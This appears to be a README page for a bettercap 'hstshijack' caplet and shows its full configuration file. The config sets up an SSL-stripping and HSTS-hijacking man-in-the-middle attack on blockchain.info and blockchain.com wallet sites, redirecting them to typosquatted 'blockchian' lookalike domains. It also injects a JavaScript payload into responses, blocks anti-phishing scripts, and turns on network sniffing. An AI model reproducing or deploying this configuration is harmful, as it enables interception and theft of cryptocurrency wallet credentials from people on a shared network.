<p align="center">
  <img height="64px" src="https://cdn.rawgit.com/yungtravla/cdn/ccdc3b8d/github.com/bettercap/caplets/hstshijack/logo.svg" />
</p>

**caplets/hstshijack.cap**

```sh
# Choose which hosts should be sslstripped (comma separated, wildcard allowed)
set sslstrip.hosts                           *

# Choose which hosts should not be sslstripped (comma separated, wildcard allowed)
set sslstrip.ignore                          github.com,*.github.com

# Choose a name for your HSTS targets (comma separated)
set hstshijack.targets                       wallets

# Choose the targeted hostnames for each HSTS target you have chosen (comma separated, wildcard allowed)
set hstshijack.wallets.targethosts           blockchain.info,*.blockchain.info,blockchain.com,*.blockchain.com

# Choose your replacement hostnames for each target hostname you have chosen (comma separated, wildcard allowed)
set hstshijack.wallets.replacementhosts      blockchian.info,*.blockchian.info,blockchian.com,*.blockchian.com

# Choose path of javascript file which will be injected into responses from each targeted host
set hstshijack.wallets.payloadpath           /root/caplets_dev/hstshijack/blockchain.info/patch.js

# Choose which paths are blocked on your HSTS targets (comma separated, wildcard allowed)
set hstshijack.wallets.blockpaths            /example/js/anti-phishing/*

# Choose if javascript will be disabled on your HSTS targets (except for your payload) (boolean) (default=false)
set hstshijack.wallets.blockscripts          true

# Choose if your HSTS targets will no longer be accessible to a client after their first POST request (boolean) (default=false)
set hstshijack.wallets.blockafterpost        false

# Choose if your HSTS targets will no longer be blocked/injected/stripped/hijacked for a client after their first POST request (boolean) (default=false)
set hstshijack.wallets.ignoreafterpost       true

# Launch
set http.proxy.script /root/caplets_dev/hstshijack.js
http.proxy on
set net.sniff.verbose false
net.sniff on
# arp.spoof  on
```
